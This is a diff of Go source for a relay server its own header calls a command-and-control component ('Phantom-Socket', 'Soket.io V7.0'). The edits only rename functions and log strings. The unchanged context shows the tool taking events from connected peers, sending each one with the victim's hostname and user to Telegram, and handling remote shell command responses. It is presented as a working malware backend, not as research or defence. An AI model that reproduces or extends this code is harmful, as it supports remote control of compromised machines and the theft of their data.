@@ -1,6 +1,6 @@
 // Project: Soket.io V7.0
 // Module: C2 Component
-// Description: Professional C2 Infrastructure component.
+// Description:  C2 Infrastructure component.
 
 package main
 
@@ -117,7 +117,7 @@ func backgroundPacketProcessor(peerID string, conn net.Conn, remoteAddr string) 
 
 		if eventType != "" {
 			logger.Printf("[ALERT] %s from %s: %s", eventType, remoteAddr, payload)
-			err := telegram.SendProfessionalAlert(telegram.AlertData{
+			err := telegram.SendAlert(telegram.AlertData{
 				EventType: eventType,
 				Hostname:  hostname,
 				User:      user,
@@ -138,7 +138,7 @@ func main() {
 	listenAddr := flag.String("listen", "", "Listen address (e.g., :42291). Overrides RELAY_LISTEN_ADDR env var")
 	flag.Parse()
 
-	logger.Println("Phantom-Socket v1.0 Final Relay Server Starting...")
+	logger.Println("Phantom-Socket v1.0 Relay Server Starting...")
 	logger.Println("Building with Go 1.22+ for high-performance concurrency")
 
 	cfg := config.LoadFromEnv()
@@ -540,7 +540,7 @@ func readCommandResponseWithMode(conn net.Conn, shellMode bool) {
 			io.ReadFull(conn, dataBuf)
 			payload := string(dataBuf)
 			logger.Printf("Received Sentinel Alert: %s", payload)
-			go telegram.SendProfessionalAlert(telegram.AlertData{
+			go telegram.SendAlert(telegram.AlertData{
 				EventType: "CONSOLE_ALERT",
 				Hostname:  "RELAY",
 				User:      "ADMIN",
